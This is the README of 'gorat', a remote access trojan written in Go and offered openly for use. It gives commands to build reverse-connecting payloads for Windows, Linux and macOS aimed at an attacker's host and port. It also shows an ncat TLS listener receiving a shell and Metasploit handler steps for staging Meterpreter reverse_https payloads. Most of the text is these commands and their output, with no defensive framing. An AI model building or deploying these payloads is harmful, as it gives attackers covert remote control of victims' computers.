# gorat
A simple rat made in go with adv features

[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)

# supported os
```
Windows
Linux
Mac OS
FreeBSD
```

# Usage

- create a valid certificate

```
$ make depends
openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
....................................................................................++
.....++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
```

# Payload available
```bash
# Predifined 32 bit target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make windows64 LHOST=192.168.0.12 LPORT=1234

# Predifined 32 bit target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
# Predifined 64 bit target
$ make linux64 LHOST=192.168.0.12 LPORT=1234
# mac os host
$ make macos LHOST=192.168.0.12 LPORT=1234
```

# example output
```
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 172.16.122.105.
Ncat: Connection from 172.16.122.105:47814.
[gorat]> whoami
windows64
```

# Meterpreter staging
```
WARNING: this currently only work for the Windows platform.
```

- payload supports for meterpter stagging
```bash
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_http
windows/x64/meterpreter/reverse_http
windows/meterpreter/reverse_https
windows/x64/meterpreter/reverse_https
```

# example output
```bash
[14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
[14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 192.168.0.1
lhost => 192.168.0.1
[14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
lport => 8443
[14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
HandlerSSLCert => ./server.pem
[14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.

[*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://192.168.0.1:8443
[14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
```
